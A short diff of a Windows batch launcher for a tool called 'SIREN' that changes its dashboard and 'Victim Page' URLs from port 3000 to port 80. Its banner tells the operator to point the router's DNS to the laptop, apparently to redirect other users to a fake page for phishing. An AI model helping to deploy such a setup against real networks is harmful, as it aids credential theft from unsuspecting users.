@@ -47,15 +47,15 @@ timeout /t 5 /nobreak > nul
 echo [4/4] Opening Admin Dashboard...
 echo.
 timeout /t 3 /nobreak > nul
-start http://localhost:3000/admin
+start http://localhost/admin
 
 echo.
 echo  ======================================================
 echo  ^|                                                    ^|
 echo  ^|   SIREN IS NOW ACTIVE!                             ^|
 echo  ^|                                                    ^|
-echo  ^|   Admin Dashboard: http://localhost:3000/admin     ^|
-echo  ^|   Victim Page:     http://localhost:3000           ^|
+echo  ^|   Admin Dashboard: http://localhost/admin          ^|
+echo  ^|   Victim Page:     http://localhost                ^|
 echo  ^|                                                    ^|
 echo  ^|   IMPORTANT: Make sure router DNS points to        ^|
 echo  ^|   this laptop's IP address!                        ^|
